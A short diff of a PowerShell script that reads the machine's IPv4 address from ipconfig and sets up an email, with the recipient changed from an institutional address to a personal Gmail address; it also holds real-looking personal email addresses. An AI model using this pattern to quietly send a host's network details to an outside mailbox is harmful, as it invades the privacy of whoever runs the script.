@@ -33,7 +33,7 @@ $path = Join-Path -Path $env:temp -ChildPath $wd
 
 # Define sender, recipient, subject, and body
 $from = "firas.riahi@ensi-uma.tn"
-$to = "eya.khalfallah@ensi-uma.tn"
+$to = "riahifiras08@gmail.com"
 $subject = "Test Email"
 $ipConfigOutput = ipconfig
 $ip = $ipConfigOutput | Select-String -Pattern 'IPv4 Address.*: ((\d{1,3}\.){3}\d{1,3})' | ForEach-Object { $_.Matches.Groups[1].Value }
